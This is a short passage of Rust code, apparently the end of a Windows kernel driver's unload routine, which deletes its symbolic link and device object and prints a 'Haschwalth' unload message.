    IoDeleteSymbolicLink(&mut sb_name);
    if !(*driver).DeviceObject.is_null() {
        IoDeleteDevice((*driver).DeviceObject);
    }
    println!("[Haschwalth] [i] Driver Unloaded");
}}
